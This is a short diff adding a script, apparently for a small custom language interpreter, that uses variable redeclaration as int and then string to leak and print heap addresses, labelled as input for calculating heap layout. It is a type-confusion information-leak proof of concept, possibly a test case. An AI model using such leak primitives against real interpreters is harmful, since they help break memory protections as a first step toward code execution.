@@ -1,0 +1,15 @@
+print("=== Type Confusion Heap Leak ===");
+int leak1 = 0;
+string leak1 = "first";
+int addr1 = leak1;
+print(addr1);
+int leak2 = 0;
+string leak2 = "second";
+int addr2 = leak2;
+print(addr2);
+int leak3 = 0;
+string leak3 = "third";
+int addr3 = leak3;
+print(addr3);
+print("=== Multiple heap addresses leaked ===");
+print("These can be used to calculate heap layout");
